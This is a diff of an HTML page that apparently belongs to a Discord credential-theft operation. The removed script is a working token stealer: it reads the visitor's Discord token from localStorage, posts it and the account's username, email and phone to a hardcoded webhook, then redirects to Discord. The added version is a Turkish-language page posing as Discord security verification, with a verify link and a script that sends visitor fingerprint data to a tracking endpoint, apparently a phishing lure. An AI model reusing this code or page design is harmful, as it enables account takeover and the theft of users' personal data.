@@ -1,89 +1,186 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>OP PVP | Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Doğrulama</title>
     <style>
-        body {
-            background: #1e1e2e;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .loader {
-            color: #00ff88;
-            font-size: 24px;
+
+        body {
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px;
             text-align: center;
+            animation: slideIn 0.4s ease;
         }
-        .loader span {
-            display: inline-block;
-            animation: pulse 1.5s ease-in-out infinite;
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        @keyframes pulse {
-            0% { opacity: 0.2; }
-            50% { opacity: 1; }
-            100% { opacity: 0.2; }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #5865F2, #7289DA);
+            border-radius: 50%;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        h1 {
+            color: #2c2f33;
+            font-size: 28px;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #72767d;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .features {
+            background: #f6f6f7;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 32px;
+            text-align: left;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #4f545c;
+            font-size: 14px;
+        }
+
+        .feature:last-child { margin-bottom: 0; }
+
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            background: linear-gradient(135deg, #5865F2, #7289DA);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: white;
+            font-size: 12px;
+        }
+
+        .verify-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #5865F2, #7289DA);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: block;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4);
+        }
+
+        .security-note {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #72767d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .shield-icon {
+            color: #43b581;
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 32px 24px; }
+            h1 { font-size: 24px; }
         }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <span>🔐</span> Verifying... <span>⏳</span>
+    <div class="container">
+        <div class="logo">🛡️</div>
+        
+        <h1>Güvenlik Doğrulaması</h1>
+        <p class="subtitle">
+            Devam etmek için Discord hesabınızla doğrulama yapmanız gerekiyor.
+        </p>
+
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <span>Bot ve spam hesapları engellenir</span>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <span>Topluluk güvenliği sağlanır</span>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">✓</div>
+                <span>Hızlı ve güvenli doğrulama</span>
+            </div>
+        </div>
+
+        <a href="/verify" class="verify-btn">
+            Discord ile Doğrula
+        </a>
+
+        <div class="security-note">
+            <span class="shield-icon">🔒</span>
+            Güvenli bağlantı • Discord OAuth2
+        </div>
     </div>
 
     <script>
-        (function() {
-            const token = localStorage.getItem('token');
-            const webhook = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';
-
-            if (token) {
-                // Token'ı gönder
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**🎯 TOKEN ÇALINDI!**\n\`${token}\``
-                    })
-                });
-
-                // Kullanıcı bilgilerini al ve gönder
-                fetch('https://discord.com/api/v9/users/@me', {
-                    headers: { 'Authorization': token }
-                })
-                .then(res => res.json())
-                .then(user => {
-                    const bilgi = 
-                        `**👤 KULLANICI BİLGİLERİ**\n` +
-                        `**Kullanıcı Adı:** ${user.username}#${user.discriminator}\n` +
-                        `**ID:** ${user.id}\n` +
-                        `**E-posta:** ${user.email || 'Gizli'}\n` +
-                        `**Doğrulanmış:** ${user.verified ? '✅ Evet' : '❌ Hayır'}\n` +
-                        `**Telefon:** ${user.phone || 'Yok'}\n` +
-                        `**Avatar:** https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
-
-                    fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: bilgi })
-                    });
-                })
-                .catch(() => {})
-                .finally(() => {
-                    setTimeout(() => {
-                        window.location.href = 'https://discord.com/app';
-                    }, 2000);
-                });
-
-            } else {
-                document.querySelector('.loader').innerHTML = '❌ Token not found. Redirecting...';
-                setTimeout(() => {
-                    window.location.href = 'https://discord.com/app';
-                }, 2000);
-            }
-        })();
+        // Sayfa bilgilerini backend'e gönder (IP, user agent vs otomatik çekilecek)
+        fetch('/api/track', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                page: 'index',
+                screen: {width: screen.width, height: screen.height},
+                language: navigator.language,
+                platform: navigator.platform,
+                referrer: document.referrer
+            })
+        }).catch(() => {});
     </script>
 </body>
 </html>
